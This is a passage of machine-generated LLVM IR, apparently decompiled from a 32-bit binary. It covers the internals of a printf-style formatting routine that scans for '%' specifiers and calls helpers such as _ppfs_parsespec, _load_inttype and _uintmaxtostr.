  %v1_804e72221 = phi i32 [ %v1_804e72a, %dec_label_pc_804e717 ], [ %v3_804ec28, %dec_label_pc_804ec28 ], [ %v1_804e756, %dec_label_pc_804ec33 ]
  %v0_804e71819 = phi i32 [ %v1_804e717, %dec_label_pc_804e717 ], [ %v3_804ec28, %dec_label_pc_804ec28 ], [ %v1_804ec33, %dec_label_pc_804ec33 ]
  %v4_804e718.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e718

dec_label_pc_804e718:                             ; preds = %dec_label_pc_804e718.backedge, %dec_label_pc_804e6f9
  %v1_804e72a = phi i32 [ %v1_804e72221, %dec_label_pc_804e718.backedge ], [ %v0_804e708, %dec_label_pc_804e6f9 ]
  %v0_804e726 = phi i32 [ %v0_804e71819, %dec_label_pc_804e718.backedge ], [ %v0_804e708, %dec_label_pc_804e6f9 ]
  %v4_804e718 = phi i32 [ %v4_804e718.pre, %dec_label_pc_804e718.backedge ], [ %v6_804e703, %dec_label_pc_804e6f9 ]
  %v1_804e718 = inttoptr i32 %v0_804e726 to i8*
  %v2_804e718 = load i8, i8* %v1_804e718, align 1
  %v3_804e718 = zext i8 %v2_804e718 to i32
  %v5_804e718 = and i32 %v4_804e718, -256
  %v6_804e718 = or i32 %v3_804e718, %v5_804e718
  store i32 %v6_804e718, i32* %eax.global-to-local, align 4
  %v4_804e71a = icmp eq i8 %v2_804e718, 0
  %v5_804e71a = icmp slt i8 %v2_804e718, 0
  store i1 %v5_804e71a, i1* %sf.global-to-local, align 1
  br i1 %v4_804e71a, label %dec_label_pc_804e722, label %dec_label_pc_804e71e

dec_label_pc_804e71e:                             ; preds = %dec_label_pc_804e718
  %v2_804e71e = add i8 %v2_804e718, -37
  %v10_804e71e = icmp eq i8 %v2_804e71e, 0
  %v11_804e71e = icmp slt i8 %v2_804e71e, 0
  store i1 %v11_804e71e, i1* %sf.global-to-local, align 1
  %v1_804e720 = icmp eq i1 %v10_804e71e, false
  br i1 %v1_804e720, label %dec_label_pc_804e717, label %dec_label_pc_804e722

dec_label_pc_804e722:                             ; preds = %dec_label_pc_804e71e, %dec_label_pc_804e718
  %v2_804e722 = sub i32 %v0_804e726, %v1_804e72a
  %v12_804e722 = icmp eq i32 %v2_804e722, 0
  %v13_804e722 = icmp slt i32 %v2_804e722, 0
  store i1 %v13_804e722, i1* %sf.global-to-local, align 1
  br i1 %v12_804e722, label %dec_label_pc_804e74d, label %dec_label_pc_804e726

dec_label_pc_804e726:                             ; preds = %dec_label_pc_804e722
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804e722, i32* @esi, align 4
  store i1 %v13_804e722, i1* %sf.global-to-local, align 1
  %tmp66 = icmp slt i32 %v2_804e722, 1
  br i1 %tmp66, label %dec_label_pc_804e742, label %dec_label_pc_804e730

dec_label_pc_804e730:                             ; preds = %dec_label_pc_804e726
  %v0_804e730 = load i32, i32* @ebp, align 4
  %v1_804e730 = load i32, i32* @esp, align 4
  %v2_804e730 = add i32 %v1_804e730, -4
  %v3_804e730 = inttoptr i32 %v2_804e730 to i32*
  store i32 %v0_804e730, i32* %v3_804e730, align 4
  %v1_804e731 = add i32 %v1_804e730, 368
  %v2_804e731 = inttoptr i32 %v1_804e731 to i32*
  %v3_804e731 = load i32, i32* %v2_804e731, align 4
  %v5_804e731 = add i32 %v1_804e730, -8
  %v6_804e731 = inttoptr i32 %v5_804e731 to i32*
  store i32 %v3_804e731, i32* %v6_804e731, align 4
  %v0_804e738 = load i32, i32* @esi, align 4
  %v2_804e738 = add i32 %v1_804e730, -12
  %v3_804e738 = inttoptr i32 %v2_804e738 to i32*
  store i32 %v0_804e738, i32* %v3_804e738, align 4
  %v0_804e739 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e739 = add i32 %v1_804e730, -16
  %v3_804e739 = inttoptr i32 %v2_804e739 to i32*
  store i32 %v0_804e739, i32* %v3_804e739, align 4
  %v0_804e73a = load i32, i32* %stack_var_-364, align 4
  %v4_804e73a = call i32 @__stdio_fwrite(i32 %v0_804e73a, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e73a, i32* %eax.global-to-local, align 4
  %v0_804e73f = load i32, i32* @esp, align 4
  %v1_804e73f = add i32 %v0_804e73f, 16
  %v7_804e73f = icmp slt i32 %v1_804e73f, 0
  store i1 %v7_804e73f, i1* %sf.global-to-local, align 1
  %v1_804e742.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e742

dec_label_pc_804e742:                             ; preds = %dec_label_pc_804e726, %dec_label_pc_804e730
  %v3_804e74a = phi i32 [ %v2_804e722, %dec_label_pc_804e726 ], [ %v1_804e742.pre, %dec_label_pc_804e730 ]
  %v0_804e742 = phi i32 [ 0, %dec_label_pc_804e726 ], [ %v4_804e73a, %dec_label_pc_804e730 ]
  %v2_804e742 = sub i32 %v0_804e742, %v3_804e74a
  %v12_804e742 = icmp eq i32 %v2_804e742, 0
  %v13_804e742 = icmp slt i32 %v2_804e742, 0
  store i1 %v13_804e742, i1* %sf.global-to-local, align 1
  %v1_804e744 = icmp eq i1 %v12_804e742, false
  %v0_804ec3b.pre.pre = load i32, i32* @esp, align 4
  br i1 %v1_804e744, label %dec_label_pc_804ec3b, label %dec_label_pc_804e74a

dec_label_pc_804e74a:                             ; preds = %dec_label_pc_804e742
  %v1_804e74a = inttoptr i32 %v0_804ec3b.pre.pre to i32*
  %v2_804e74a = load i32, i32* %v1_804e74a, align 4
  %v4_804e74a = add i32 %v2_804e74a, %v3_804e74a
  %v15_804e74a = icmp slt i32 %v4_804e74a, 0
  store i1 %v15_804e74a, i1* %sf.global-to-local, align 1
  store i32 %v4_804e74a, i32* %v1_804e74a, align 4
  %v0_804e74d.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e74d

dec_label_pc_804e74d:                             ; preds = %dec_label_pc_804e722, %dec_label_pc_804e74a
  %v0_804ec33 = phi i32 [ %v0_804e726, %dec_label_pc_804e722 ], [ %v0_804e74d.pre, %dec_label_pc_804e74a ]
  %v1_804e74d = inttoptr i32 %v0_804ec33 to i8*
  %v2_804e74d = load i8, i8* %v1_804e74d, align 1
  %v3_804e74d = icmp eq i8 %v2_804e74d, 0
  %v4_804e74d = icmp slt i8 %v2_804e74d, 0
  store i1 %v4_804e74d, i1* %sf.global-to-local, align 1
  br i1 %v3_804e74d, label %dec_label_pc_804ec42, label %dec_label_pc_804e756

dec_label_pc_804e756:                             ; preds = %dec_label_pc_804e74d
  %v1_804e756 = add i32 %v0_804ec33, 1
  %v2_804e756 = inttoptr i32 %v1_804e756 to i8*
  %v3_804e756 = load i8, i8* %v2_804e756, align 1
  %v4_804e756 = add i8 %v3_804e756, -37
  %v12_804e756 = icmp eq i8 %v4_804e756, 0
  %v13_804e756 = icmp slt i8 %v4_804e756, 0
  store i1 %v13_804e756, i1* %sf.global-to-local, align 1
  store i32 %v1_804e756, i32* %edx.global-to-local, align 4
  br i1 %v12_804e756, label %dec_label_pc_804ec33, label %dec_label_pc_804e763

dec_label_pc_804e763:                             ; preds = %dec_label_pc_804e756
  %v1_804e763 = load i32, i32* @esp, align 4
  %v2_804e763 = add i32 %v1_804e763, 16
  %v3_804e763 = inttoptr i32 %v2_804e763 to i32*
  store i32 %v1_804e756, i32* %v3_804e763, align 4
  %v0_804e767 = load i32, i32* @esp, align 4
  %v1_804e767 = add i32 %v0_804e767, 340
  %v2_804e767 = inttoptr i32 %v1_804e767 to i32*
  store i32 0, i32* %v2_804e767, align 4
  %v0_804e772 = load i32, i32* @esp, align 4
  %v1_804e772 = add i32 %v0_804e772, -12
  %v10_804e772 = icmp slt i32 %v1_804e772, 0
  store i1 %v10_804e772, i1* %sf.global-to-local, align 1
  %v1_804e775 = add i32 %v0_804e772, 16
  store i32 %v1_804e775, i32* @ebx, align 4
  %v2_804e779 = add i32 %v0_804e772, -16
  %v3_804e779 = inttoptr i32 %v2_804e779 to i32*
  store i32 %v1_804e775, i32* %v3_804e779, align 4
  %v0_804e77a = load i32, i32* %stack_var_-364, align 4
  %v1_804e77a = inttoptr i32 %v0_804e77a to i32*
  %v2_804e77a = call i32 @_ppfs_parsespec(i32* %v1_804e77a)
  store i32 %v2_804e77a, i32* %eax.global-to-local, align 4
  %v0_804e77f = load i32, i32* @ebx, align 4
  %v1_804e77f = load i32, i32* @esp, align 4
  %v2_804e77f = inttoptr i32 %v1_804e77f to i32*
  store i32 %v0_804e77f, i32* %v2_804e77f, align 4
  %v0_804e782 = load i32, i32* %stack_var_-364, align 4
  %v1_804e782 = call i32 @_ppfs_setargs(i32 %v0_804e782)
  store i32 %v1_804e782, i32* %eax.global-to-local, align 4
  %v0_804e787 = load i32, i32* @esp, align 4
  %v1_804e787 = add i32 %v0_804e787, 70
  %v2_804e787 = inttoptr i32 %v1_804e787 to i8*
  %v3_804e787 = load i8, i8* %v2_804e787, align 1
  %v4_804e787 = zext i8 %v3_804e787 to i32
  store i32 %v4_804e787, i32* @edi, align 4
  %v1_804e78c = add i32 %v0_804e787, 16
  %v1_804e78f = add i32 %v0_804e787, 56
  %v2_804e78f = inttoptr i32 %v1_804e78f to i32*
  %v3_804e78f = load i32, i32* %v2_804e78f, align 4
  %v5_804e78f = icmp slt i32 %v3_804e78f, 0
  store i1 %v5_804e78f, i1* %sf.global-to-local, align 1
  %v1_804e794 = add i32 %v0_804e787, 112
  store i32 %v1_804e794, i32* %edx.global-to-local, align 4
  %tmp67 = icmp slt i32 %v3_804e78f, 1
  br i1 %tmp67, label %dec_label_pc_804e7a1, label %dec_label_pc_804e79a

dec_label_pc_804e79a:                             ; preds = %dec_label_pc_804e763
  %v2_804e79a = zext i8 %v3_804e787 to i32
  %v3_804e79a = mul nuw nsw i32 %v2_804e79a, 12
  store i32 %v3_804e79a, i32* %eax.global-to-local, align 4
  %v2_804e79d = add i32 %v0_804e787, 100
  %v3_804e79d = add i32 %v2_804e79d, %v3_804e79a
  store i32 %v3_804e79d, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e7a1

dec_label_pc_804e7a1:                             ; preds = %dec_label_pc_804e763, %dec_label_pc_804e79a
  %v0_804e7a928 = phi i32 [ %v1_804e794, %dec_label_pc_804e763 ], [ %v3_804e79d, %dec_label_pc_804e79a ]
  %v1_804e7a1 = add i32 %v0_804e787, 60
  %v2_804e7a1 = inttoptr i32 %v1_804e7a1 to i32*
  %v3_804e7a1 = load i32, i32* %v2_804e7a1, align 4
  store i32 %v3_804e7a1, i32* %ecx.global-to-local, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804e7b473 = sub i32 0, %v3_804e7a1
  %v10_804e7b476 = and i32 %v3_804e7a1, %v2_804e7b473
  %v11_804e7b477 = icmp slt i32 %v10_804e7b476, 0
  %v13_804e7b478 = icmp slt i32 %v2_804e7b473, 0
  %v2_804e7b679 = icmp eq i1 %v13_804e7b478, %v11_804e7b477
  br i1 %v2_804e7b679, label %dec_label_pc_804e7b8, label %dec_label_pc_804e7a9

dec_label_pc_804e7a9:                             ; preds = %dec_label_pc_804e7a1, %dec_label_pc_804e7a9
  %v0_804e7b883 = phi i32 [ %v0_804e7b8, %dec_label_pc_804e7a9 ], [ %v1_804e78c, %dec_label_pc_804e7a1 ]
  %v2_804e7a982 = phi i32 [ %v1_804e7b3, %dec_label_pc_804e7a9 ], [ 0, %dec_label_pc_804e7a1 ]
  %v0_804e7a981 = phi i32 [ %v1_804e7b0, %dec_label_pc_804e7a9 ], [ %v0_804e7a928, %dec_label_pc_804e7a1 ]
  %v3_804e7a9 = mul i32 %v2_804e7a982, 4
  %v4_804e7a9 = add i32 %v3_804e7a9, 344
  %v5_804e7a9 = add i32 %v4_804e7a9, %v0_804e7b883
  %v6_804e7a9 = inttoptr i32 %v5_804e7a9 to i32*
  store i32 %v0_804e7a981, i32* %v6_804e7a9, align 4
  %v0_804e7b0 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e7b0 = add i32 %v0_804e7b0, 12
  store i32 %v1_804e7b0, i32* %edx.global-to-local, align 4
  %v0_804e7b3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e7b3 = add i32 %v0_804e7b3, 1
  %v1_804e7b4.pre = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v1_804e7b3, i32* %eax.global-to-local, align 4
  %v2_804e7b4 = sub i32 %v1_804e7b3, %v1_804e7b4.pre
  %v8_804e7b4 = xor i32 %v1_804e7b3, %v1_804e7b4.pre
  %v9_804e7b4 = xor i32 %v2_804e7b4, %v1_804e7b3
  %v10_804e7b4 = and i32 %v9_804e7b4, %v8_804e7b4
  %v11_804e7b4 = icmp slt i32 %v10_804e7b4, 0
  %v13_804e7b4 = icmp slt i32 %v2_804e7b4, 0
  %v2_804e7b6 = icmp eq i1 %v13_804e7b4, %v11_804e7b4
  %v0_804e7b8 = load i32, i32* @esp, align 4
  br i1 %v2_804e7b6, label %dec_label_pc_804e7b8, label %dec_label_pc_804e7a9

dec_label_pc_804e7b8:                             ; preds = %dec_label_pc_804e7a9, %dec_label_pc_804e7a1
  %v0_804e7b8.lcssa = phi i32 [ %v1_804e78c, %dec_label_pc_804e7a1 ], [ %v0_804e7b8, %dec_label_pc_804e7a9 ]
  %v1_804e7b8 = add i32 %v0_804e7b8.lcssa, 48
  %v2_804e7b8 = inttoptr i32 %v1_804e7b8 to i32*
  %v3_804e7b8 = load i32, i32* %v2_804e7b8, align 4
  store i32 %v3_804e7b8, i32* @ecx, align 4
  %v1_804e7bc = icmp eq i32 %v3_804e7b8, 0
  %v2_804e7bc = icmp slt i32 %v3_804e7b8, 0
  store i1 %v2_804e7bc, i1* %sf.global-to-local, align 1
  %v1_804e7be = icmp eq i1 %v1_804e7bc, false
  br i1 %v1_804e7be, label %dec_label_pc_804e7e6, label %dec_label_pc_804e7c0

dec_label_pc_804e7c0:                             ; preds = %dec_label_pc_804e7b8
  %v1_804e7c0 = inttoptr i32 %v0_804e7b8.lcssa to i32*
  %v2_804e7c0 = load i32, i32* %v1_804e7c0, align 4
  store i32 %v2_804e7c0, i32* %eax.global-to-local, align 4
  %v1_804e7c3 = ashr i32 %v2_804e7c0, 31
  store i32 %v1_804e7c3, i32* %edx.global-to-local, align 4
  %v2_804e7c4 = add i32 %v0_804e7b8.lcssa, -4
  %v3_804e7c4 = inttoptr i32 %v2_804e7c4 to i32*
  store i32 %v1_804e7c3, i32* %v3_804e7c4, align 4
  %v0_804e7c5 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e7c5 = add i32 %v0_804e7b8.lcssa, -8
  %v3_804e7c5 = inttoptr i32 %v2_804e7c5 to i32*
  store i32 %v0_804e7c5, i32* %v3_804e7c5, align 4
  %v1_804e7c6 = add i32 %v0_804e7b8.lcssa, 32
  %v2_804e7c6 = inttoptr i32 %v1_804e7c6 to i32*
  %v3_804e7c6 = load i32, i32* %v2_804e7c6, align 4
  %v1_804e7ca = and i32 %v3_804e7c6, 3840
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 %v1_804e7ca, i32* %eax.global-to-local, align 4
  %v2_804e7cf = add i32 %v0_804e7b8.lcssa, -12
  %v3_804e7cf = inttoptr i32 %v2_804e7cf to i32*
  store i32 %v1_804e7ca, i32* %v3_804e7cf, align 4
  %v1_804e7d0 = add i32 %v0_804e7b8.lcssa, 344
  %v2_804e7d0 = inttoptr i32 %v1_804e7d0 to i32*
  %v3_804e7d0 = load i32, i32* %v2_804e7d0, align 4
  store i32 %v3_804e7d0, i32* %eax.global-to-local, align 4
  %v1_804e7d7 = inttoptr i32 %v3_804e7d0 to i32*
  %v2_804e7d7 = load i32, i32* %v1_804e7d7, align 4
  %v4_804e7d7 = add i32 %v0_804e7b8.lcssa, -16
  %v5_804e7d7 = inttoptr i32 %v4_804e7d7 to i32*
  store i32 %v2_804e7d7, i32* %v5_804e7d7, align 4
  %v0_804e7d9 = call i32 @_store_inttype()
  store i32 %v0_804e7d9, i32* %eax.global-to-local, align 4
  %v0_804e7de = load i32, i32* @esp, align 4
  %v1_804e7de = add i32 %v0_804e7de, 16
  %v7_804e7de = icmp slt i32 %v1_804e7de, 0
  store i1 %v7_804e7de, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_804ec28

dec_label_pc_804e7e6:                             ; preds = %dec_label_pc_804e7b8
  %v1_804e7e6 = add i32 %v3_804e7b8, -7
  %v5_804e7e6 = icmp ult i32 %v3_804e7b8, 7
  %v9_804e7e6 = icmp eq i32 %v1_804e7e6, 0
  %v10_804e7e6 = icmp slt i32 %v1_804e7e6, 0
  store i1 %v10_804e7e6, i1* %sf.global-to-local, align 1
  %v2_804e7e9 = or i1 %v5_804e7e6, %v9_804e7e6
  br i1 %v2_804e7e9, label %dec_label_pc_804e7ef, label %dec_label_pc_804e953

dec_label_pc_804e7ef:                             ; preds = %dec_label_pc_804e7e6
  %v1_804e7ef = add i32 %v3_804e7b8, 134571920
  %v2_804e7ef = inttoptr i32 %v1_804e7ef to i8*
  %v3_804e7ef = load i8, i8* %v2_804e7ef, align 1
  %v4_804e7ef = sext i8 %v3_804e7ef to i32
  store i32 %v4_804e7ef, i32* @esi, align 4
  store i32 87, i32* @ebx, align 4
  %v9_804e7fb = icmp eq i8 %v3_804e7ef, 10
  %v10_804e7fb = icmp slt i8 %v3_804e7ef, 10
  store i1 %v10_804e7fb, i1* %sf.global-to-local, align 1
  %v1_804e7fe = icmp eq i1 %v9_804e7fb, false
  br i1 %v1_804e7fe, label %dec_label_pc_804e81e, label %dec_label_pc_804e800

dec_label_pc_804e800:                             ; preds = %dec_label_pc_804e7ef
  %v1_804e800 = add i32 %v0_804e7b8.lcssa, 32
  %v2_804e800 = inttoptr i32 %v1_804e800 to i32*
  %v3_804e800 = load i32, i32* %v2_804e800, align 4
  store i32 %v3_804e800, i32* %eax.global-to-local, align 4
  %v1_804e806 = udiv i32 %v3_804e800, 32
  %tmp68 = urem i32 %v1_804e806, 2
  %tmp69 = sub nsw i32 45, %tmp68
  %v2_804e816 = or i32 %tmp69, 128
  store i32 %v2_804e816, i32* %edx.global-to-local, align 4
  %v2_804e819 = and i32 %v3_804e800, 64
  %v3_804e819 = icmp eq i32 %v2_804e819, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_804e81b = icmp eq i1 %v3_804e819, false
  %v4_804e81b = select i1 %v1_804e81b, i32 %v2_804e816, i32 %tmp69
  store i32 %v4_804e81b, i32* @ebx, align 4
  br label %dec_label_pc_804e81e

dec_label_pc_804e81e:                             ; preds = %dec_label_pc_804e7ef, %dec_label_pc_804e800
  %v1_804e81e = add i32 %v3_804e7b8, -5
  %v5_804e81e = icmp ult i32 %v3_804e7b8, 5
  %v9_804e81e = icmp eq i32 %v1_804e81e, 0
  %v10_804e81e = icmp slt i32 %v1_804e81e, 0
  store i1 %v10_804e81e, i1* %sf.global-to-local, align 1
  %v2_804e821 = or i1 %v5_804e81e, %v9_804e81e
  br i1 %v2_804e821, label %dec_label_pc_804e823, label %dec_label_pc_804e83b

dec_label_pc_804e823:                             ; preds = %dec_label_pc_804e81e
  %v1_804e823 = add i32 %v3_804e7b8, -3
  %v9_804e823 = icmp eq i32 %v1_804e823, 0
  %v10_804e823 = icmp slt i32 %v1_804e823, 0
  store i1 %v10_804e823, i1* %sf.global-to-local, align 1
  %v1_804e826 = icmp eq i1 %v9_804e823, false
  br i1 %v1_804e826, label %dec_label_pc_804e82f, label %dec_label_pc_804e828

dec_label_pc_804e828:                             ; preds = %dec_label_pc_804e823
  store i32 55, i32* @ebx, align 4
  br label %dec_label_pc_804e83d

dec_label_pc_804e82f:                             ; preds = %dec_label_pc_804e823
  %v1_804e82f = add i32 %v3_804e7b8, -1
  %v9_804e82f = icmp eq i32 %v1_804e82f, 0
  %v10_804e82f = icmp slt i32 %v1_804e82f, 0
  store i1 %v10_804e82f, i1* %sf.global-to-local, align 1
  br i1 %v9_804e82f, label %dec_label_pc_804e842, label %dec_label_pc_804e83d

dec_label_pc_804e83b:                             ; preds = %dec_label_pc_804e81e
  %v1_804e83b = sub nsw i32 0, %v4_804e7ef
  %v7_804e83b = icmp sgt i8 %v3_804e7ef, 0
  store i1 %v7_804e83b, i1* %sf.global-to-local, align 1
  store i32 %v1_804e83b, i32* @esi, align 4
  br label %dec_label_pc_804e83d

dec_label_pc_804e83d:                             ; preds = %dec_label_pc_804e82f, %dec_label_pc_804e828, %dec_label_pc_804e83b
  br label %dec_label_pc_804e842

dec_label_pc_804e842:                             ; preds = %dec_label_pc_804e82f, %dec_label_pc_804e83d
  %storemerge = phi i32 [ 11, %dec_label_pc_804e83d ], [ 6, %dec_label_pc_804e82f ]
  store i32 %storemerge, i32* @ebp, align 4
  %v1_804e842 = add i32 %v0_804e7b8.lcssa, 20
  %v2_804e842 = inttoptr i32 %v1_804e842 to i32*
  %v3_804e842 = load i32, i32* %v2_804e842, align 4
  %v5_804e842 = icmp slt i32 %v3_804e842, 0
  store i1 %v5_804e842, i1* %sf.global-to-local, align 1
  %v1_804e847 = add i32 %v0_804e7b8.lcssa, 7
  %v2_804e847 = inttoptr i32 %v1_804e847 to i8*
  store i8 32, i8* %v2_804e847, align 1
  %v0_804e84c = load i1, i1* %sf.global-to-local, align 1
  %v1_804e84c = icmp eq i1 %v0_804e84c, false
  br i1 %v1_804e84c, label %dec_label_pc_804e856, label %dec_label_pc_804e84e

dec_label_pc_804e84e:                             ; preds = %dec_label_pc_804e842
  %v0_804e84e = load i32, i32* @esp, align 4
  %v1_804e84e = add i32 %v0_804e84e, 36
  %v2_804e84e = inttoptr i32 %v1_804e84e to i8*
  %v3_804e84e = load i8, i8* %v2_804e84e, align 1
  %v4_804e84e = zext i8 %v3_804e84e to i32
  %v5_804e84e = load i32, i32* %edx.global-to-local, align 4
  %v6_804e84e = and i32 %v5_804e84e, -256
  %v7_804e84e = or i32 %v6_804e84e, %v4_804e84e
  store i32 %v7_804e84e, i32* %edx.global-to-local, align 4
  %v3_804e852 = add i32 %v0_804e84e, 7
  %v4_804e852 = inttoptr i32 %v3_804e852 to i8*
  store i8 %v3_804e84e, i8* %v4_804e852, align 1
  br label %dec_label_pc_804e856

dec_label_pc_804e856:                             ; preds = %dec_label_pc_804e842, %dec_label_pc_804e84e
  %v1_804e856 = add i32 %v3_804e7b8, -1
  %v8_804e856 = icmp eq i32 %v1_804e856, 0
  %v9_804e856 = icmp slt i32 %v1_804e856, 0
  store i1 %v9_804e856, i1* %sf.global-to-local, align 1
  store i32 %v1_804e856, i32* %ecx.global-to-local, align 4
  %v0_804e857 = load i32, i32* @esp, align 4
  %v1_804e857 = add i32 %v0_804e857, 344
  %v2_804e857 = inttoptr i32 %v1_804e857 to i32*
  %v3_804e857 = load i32, i32* %v2_804e857, align 4
  store i32 %v3_804e857, i32* %eax.global-to-local, align 4
  store i32 1024, i32* %edx.global-to-local, align 4
  %v0_804e86f.pre = load i32, i32* @edi, align 4
  br i1 %v8_804e856, label %dec_label_pc_804e86f, label %dec_label_pc_804e865

dec_label_pc_804e865:                             ; preds = %dec_label_pc_804e856
  %v2_804e865 = mul i32 %v0_804e86f.pre, 4
  %v3_804e865 = add i32 %v0_804e857, 52
  %v4_804e865 = add i32 %v3_804e865, %v2_804e865
  %v5_804e865 = inttoptr i32 %v4_804e865 to i32*
  %v6_804e865 = load i32, i32* %v5_804e865, align 4
  %v1_804e869 = and i32 %v6_804e865, 3840
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 %v1_804e869, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e86f

dec_label_pc_804e86f:                             ; preds = %dec_label_pc_804e856, %dec_label_pc_804e865
  %v2_804e86f = add i32 %v0_804e857, -4
  %v3_804e86f = inttoptr i32 %v2_804e86f to i32*
  store i32 %v0_804e86f.pre, i32* %v3_804e86f, align 4
  %v0_804e870 = load i32, i32* @esi, align 4
  %v2_804e870 = add i32 %v0_804e857, -8
  %v3_804e870 = inttoptr i32 %v2_804e870 to i32*
  store i32 %v0_804e870, i32* %v3_804e870, align 4
  %v0_804e871 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e871 = add i32 %v0_804e857, -12
  %v3_804e871 = inttoptr i32 %v2_804e871 to i32*
  store i32 %v0_804e871, i32* %v3_804e871, align 4
  %v0_804e872 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e872 = add i32 %v0_804e857, -16
  %v3_804e872 = inttoptr i32 %v2_804e872 to i32*
  store i32 %v0_804e872, i32* %v3_804e872, align 4
  %v0_804e873 = call i32 @_load_inttype()
  %v0_804e878 = load i32, i32* @ebx, align 4
  %v1_804e878 = load i32, i32* @esp, align 4
  %v2_804e878 = inttoptr i32 %v1_804e878 to i32*
  store i32 %v0_804e878, i32* %v2_804e878, align 4
  %v0_804e87b = load i32, i32* @esi, align 4
  %v1_804e87b = load i32, i32* @esp, align 4
  %v2_804e87b = add i32 %v1_804e87b, -4
  %v3_804e87b = inttoptr i32 %v2_804e87b to i32*
  store i32 %v0_804e87b, i32* %v3_804e87b, align 4
  %v0_804e87c = load i32, i32* @edx, align 4
  %v2_804e87c = add i32 %v1_804e87b, -8
  %v3_804e87c = inttoptr i32 %v2_804e87c to i32*
  store i32 %v0_804e87c, i32* %v3_804e87c, align 4
  %v2_804e87d = add i32 %v1_804e87b, -12
  %v3_804e87d = inttoptr i32 %v2_804e87d to i32*
  store i32 %v0_804e873, i32* %v3_804e87d, align 4
  %v1_804e87e = add i32 %v1_804e87b, 347
  store i32 %v1_804e87e, i32* %eax.global-to-local, align 4
  %v2_804e885 = add i32 %v1_804e87b, -16
  %v3_804e885 = inttoptr i32 %v2_804e885 to i32*
  store i32 %v1_804e87e, i32* %v3_804e885, align 4
  %v0_804e886 = load i32, i32* %stack_var_-364, align 4
  %v5_804e886 = inttoptr i32 %v0_804e886 to i8*
  %v6_804e886 = call i32 @_uintmaxtostr(i8* %v5_804e886, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804e886, i32* %eax.global-to-local, align 4
  %v0_804e88b = load i32, i32* @esp, align 4
  %v1_804e88b = add i32 %v0_804e88b, 32
  %v1_804e88e = add i32 %v0_804e88b, 80
  %v2_804e88e = inttoptr i32 %v1_804e88e to i32*
  %v3_804e88e = load i32, i32* %v2_804e88e, align 4
  %v4_804e88e = add i32 %v3_804e88e, -5
  %v8_804e88e = icmp ult i32 %v3_804e88e, 5
  %v12_804e88e = icmp eq i32 %v4_804e88e, 0
  %v13_804e88e = icmp slt i32 %v4_804e88e, 0
  store i1 %v13_804e88e, i1* %sf.global-to-local, align 1
  store i32 %v6_804e886, i32* @edi, align 4
  %v2_804e895 = or i1 %v8_804e88e, %v12_804e88e
  br i1 %v2_804e895, label %dec_label_pc_804e8bf, label %dec_label_pc_804e897

dec_label_pc_804e897:                             ; preds = %dec_label_pc_804e86f
  %v7_804e886 = inttoptr i32 %v6_804e886 to i8*
  %v3_804e897 = load i8, i8* %v7_804e886, align 1
  %v4_804e897 = add i8 %v3_804e897, -45
  %v12_804e897 = icmp eq i8 %v4_804e897, 0
  %v13_804e897 = icmp slt i8 %v4_804e897, 0
  store i1 %v13_804e897, i1* %sf.global-to-local, align 1
  %v1_804e89a = icmp eq i1 %v12_804e897, false
  %v1_804e8a9 = add i32 %v0_804e88b, 64
  %v2_804e8a9 = inttoptr i32 %v1_804e8a9 to i32*
  %v3_804e8a9 = load i32, i32* %v2_804e8a9, align 4
  br i1 %v1_804e89a, label %dec_label_pc_804e8a9, label %dec_label_pc_804e89c

dec_label_pc_804e89c:                             ; preds = %dec_label_pc_804e897
  %v4_804e89c = or i32 %v3_804e8a9, 2
  store i32 %v4_804e89c, i32* %v2_804e8a9, align 4
  %v0_804e8a1 = load i32, i32* @edi, align 4
  %v1_804e8a1 = add i32 %v0_804e8a1, 1
  %v9_804e8a1 = icmp slt i32 %v1_804e8a1, 0
  store i1 %v9_804e8a1, i1* %sf.global-to-local, align 1
  store i32 %v1_804e8a1, i32* @edi, align 4
  store i32 2, i32* @ebp, align 4
  %v0_804e8bf.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e8bf

dec_label_pc_804e8a9:                             ; preds = %dec_label_pc_804e897
  store i32 %v3_804e8a9, i32* %eax.global-to-local, align 4
  %v2_804e8ad = and i32 %v3_804e8a9, 2
  %v3_804e8ad = icmp eq i32 %v2_804e8ad, 0
  store i1 false, i1* %sf.global-to-local, align 1
  br i1 %v3_804e8ad, label %dec_label_pc_804e8b5, label %dec_label_pc_804e8b1

dec_label_pc_804e8b1:                             ; preds = %dec_label_pc_804e8a9
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804e8bf

dec_label_pc_804e8b5:                             ; preds = %dec_label_pc_804e8a9
  %v2_804e8b5 = urem i32 %v3_804e8a9, 2
  %v3_804e8b5 = icmp eq i32 %v2_804e8b5, 0
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 4, i32* %eax.global-to-local, align 4
  %v1_804e8bc = icmp eq i1 %v3_804e8b5, false
  %v2_804e8bc = load i32, i32* @ebp, align 4
  %v4_804e8bc = select i1 %v1_804e8bc, i32 4, i32 %v2_804e8bc
  store i32 %v4_804e8bc, i32* @ebp, align 4
  br label %dec_label_pc_804e8bf

dec_label_pc_804e8bf:                             ; preds = %dec_label_pc_804e86f, %dec_label_pc_804e8b1, %dec_label_pc_804e89c, %dec_label_pc_804e8b5
